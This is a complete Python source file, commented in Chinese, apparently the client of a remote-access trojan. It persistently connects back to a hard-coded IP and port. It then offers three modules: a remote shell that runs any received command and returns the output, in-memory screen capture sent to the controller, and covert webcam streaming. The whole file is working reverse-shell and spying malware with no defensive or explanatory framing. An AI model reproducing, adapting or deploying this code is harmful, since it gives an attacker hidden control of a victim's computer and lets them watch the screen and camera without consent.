import socket
import time
import os
import subprocess
import cv2
import numpy as np
import io
from PIL import ImageGrab

IP, PORT = '192.168.0.106', 8080

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))

        while True:
            # 只读1字节，防止与后续指令粘包
            choice_raw = client.recv(1)
            if not choice_raw: break
            choice = choice_raw.decode()

            # 模块1：Shell模式
            if choice == '1':
                while True:
                    cmd = client.recv(1024).decode()
                    if cmd == '0': break
                    if cmd.startswith('cd '):
                        try:
                            os.chdir(cmd[3:].strip())
                            output = f"CWD: {os.getcwd()}"
                        except Exception as e: output = str(e)
                    else:
                        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='gbk')
                        output = (res.stdout + res.stderr) or '(无输出)'
                                
                    out_bytes = output.encode('gbk', errors='ignore')
                    client.sendall(f"{len(out_bytes):08d}".encode() + out_bytes)

            # 模块2：屏幕监控
            elif choice == '2':
                while True:
                    raw_data = client.recv(1024)
                    if not raw_data:
                        break
                    action = raw_data.decode().strip()
                    if action == 'stop':
                        break
                    elif action == 'get':
                        # 内存处理，不写硬盘
                        img = ImageGrab.grab()
                        img_byte_arr = io.BytesIO()
                        img.save(img_byte_arr, format='JPEG', quality=30)
                        data = img_byte_arr.getvalue()
                        client.sendall(f"{len(data):08d}".encode() + data)

            # 模块3：摄像头监控
            elif choice == '3':
                cap = None
                try:
                    if os.name == 'nt':
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    else:
                        cap = cv2.VideoCapture(0)
                    
                    print(f"[*] 摄像头开启状态: {cap.isOpened()}")
                    
                    while True:
                        raw_data = client.recv(1024)
                        if not raw_data:
                            break
                            
                        action = raw_data.decode().strip()
                        if action == 'stop': 
                            break
                        elif action == 'get':
                            if cap.isOpened():
                                ret, frame = cap.read()
                                if ret:
                                    _, img_encode = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                                    data = img_encode.tobytes()
                                else: 
                                    data = b''
                            else:
                                data = b''
                            client.sendall(f"{len(data):08d}".encode() + data)
                finally:
                    if cap is not None:
                        cap.release()
                    time.sleep(1)
                    
    except Exception as e:
        time.sleep(5)
    finally:
        client.close()